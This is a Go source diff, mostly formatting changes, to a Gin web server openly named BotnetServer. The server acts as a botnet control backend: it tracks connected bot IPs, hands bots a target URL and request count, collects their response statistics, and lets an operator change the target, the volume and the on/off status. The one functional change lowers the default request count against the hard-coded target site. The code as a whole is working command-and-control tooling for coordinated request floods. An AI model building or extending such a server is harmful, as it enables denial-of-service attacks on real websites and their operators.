@@ -10,24 +10,24 @@ import (
 )
 
 type BotnetServer struct {
-	Status bool
+	Status        bool
 	ConnectedBots map[string]time.Time
 	BotsResponses []BotStats
 }
 
 type BotStats struct {
-	Target string
-	Status []int
+	Target       string
+	Status       []int
 	ResponseTime time.Time
 }
 
 type BotStatsReqBody struct {
 	Target string `json:"target"`
-	Status []int `json:"status"`
+	Status []int  `json:"status"`
 }
 
 type TargetInfo struct {
-	TargetUrl string
+	TargetUrl  string
 	RequestNum int
 }
 
@@ -43,11 +43,11 @@ type SetRequestsNumberReqBody struct {
 	RequestsNumber int `json:"requestsNumber"`
 }
 
-var targetInfo = TargetInfo{"https://theuselessweb.com/", 50}
+var targetInfo = TargetInfo{"https://theuselessweb.com/", 10}
 var botnetServer = BotnetServer{true, make(map[string]time.Time), []BotStats{}}
 var PORT = 5000
 
-func PostSendBotStats (c *gin.Context) {
+func PostSendBotStats(c *gin.Context) {
 	var botStatsResponse BotStatsReqBody
 	err := c.ShouldBindJSON(&botStatsResponse)
 
@@ -60,23 +60,23 @@ func PostSendBotStats (c *gin.Context) {
 		return
 	} else {
 		c.JSON(500, gin.H{
-			"messsage": "Error getting bot stats", 
+			"messsage": "Error getting bot stats",
 		})
 		return
 	}
 }
 
-func GetTargetInfo (c *gin.Context) {
+func GetTargetInfo(c *gin.Context) {
 	botnetServer.ConnectedBots[c.ClientIP()] = time.Now()
-	
+
 	c.JSON(200, gin.H{
-		"status": botnetServer.Status,
-		"targetUrl": targetInfo.TargetUrl,
+		"status":     botnetServer.Status,
+		"targetUrl":  targetInfo.TargetUrl,
 		"requestNum": targetInfo.RequestNum,
 	})
 }
 
-func SetServerStatus (c *gin.Context) {
+func SetServerStatus(c *gin.Context) {
 	var serverStatusReqBody ServerStatusReqBody
 	err := c.ShouldBindJSON(&serverStatusReqBody)
 
@@ -89,13 +89,13 @@ func SetServerStatus (c *gin.Context) {
 		return
 	} else {
 		c.JSON(500, gin.H{
-			"messsage": "Oops, error while setting server status", 
+			"messsage": "Oops, error while setting server status",
 		})
 		return
 	}
 }
 
-func GetServerStatus (c *gin.Context) {
+func GetServerStatus(c *gin.Context) {
 	c.JSON(200, gin.H{
 		"status": botnetServer.Status,
 	})
@@ -114,36 +114,36 @@ func ChangeTarget(c *gin.Context) {
 		return
 	} else {
 		c.JSON(500, gin.H{
-			"messsage": "Oops, error while changin target", 
+			"messsage": "Oops, error while changin target",
 		})
 		return
 	}
 }
 
-func GetConnectedBots (c *gin.Context) {
+func GetConnectedBots(c *gin.Context) {
 	connectedBots := []string{}
 
-    for botIp, lastConnectionTime := range botnetServer.ConnectedBots {
+	for botIp, lastConnectionTime := range botnetServer.ConnectedBots {
 		activeConnectionTimeBound := time.Now().Add(-10 * time.Minute)
 
-		if (!lastConnectionTime.Before(activeConnectionTimeBound)) {
+		if !lastConnectionTime.Before(activeConnectionTimeBound) {
 			connectedBots = append(connectedBots, botIp)
 		}
-    }
+	}
 
 	c.JSON(200, gin.H{
 		"connectedBots": connectedBots,
 	})
 }
 
-func GetBotsStats (c *gin.Context) {
+func GetBotsStats(c *gin.Context) {
 	c.JSON(200, gin.H{
 		"stats": botnetServer.BotsResponses,
 	})
 }
 
-func SetRequestsNumber (c* gin.Context) {
-	var setRequestsNumberReqBody SetRequestsNumberReqBody;
+func SetRequestsNumber(c *gin.Context) {
+	var setRequestsNumberReqBody SetRequestsNumberReqBody
 	err := c.ShouldBindJSON(&setRequestsNumberReqBody)
 
 	if err == nil {
@@ -155,17 +155,16 @@ func SetRequestsNumber (c* gin.Context) {
 		return
 	} else {
 		c.JSON(500, gin.H{
-			"messsage": "Oops, error while setting requests number", 
+			"messsage": "Oops, error while setting requests number",
 		})
 		return
-	}	
+	}
 }
-
 
 func main() {
 	server := gin.Default()
 	server.Use(cors.Default())
-	
+
 	server.GET("/getTargetInfo", GetTargetInfo)
 	server.GET("/getServerStatus", GetServerStatus)
 	server.GET("/getConnectedBots", GetConnectedBots)
